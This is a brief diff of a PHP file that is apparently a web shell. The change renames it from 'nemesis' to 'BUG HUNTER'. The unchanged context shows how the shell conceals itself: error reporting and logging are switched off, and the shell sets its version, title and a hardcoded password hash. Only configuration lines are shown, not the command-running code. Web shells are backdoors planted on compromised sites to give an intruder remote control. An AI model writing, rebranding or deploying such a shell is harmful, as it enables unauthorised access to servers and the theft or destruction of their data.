@@ -7,7 +7,7 @@ error_reporting(0);
 @ini_set('log_errors','0');
 @clearstatcache();
 
-$s_name = "nemesis"; // shell name
+$s_name = "BUG HUNTER"; // shell name
 $s_ver = "0.1"; // shell ver
 $s_title = $s_name." ".$s_ver; // shell title
 $s_pass = "59606609c6f2b0f4ac81167fe123c3f1";
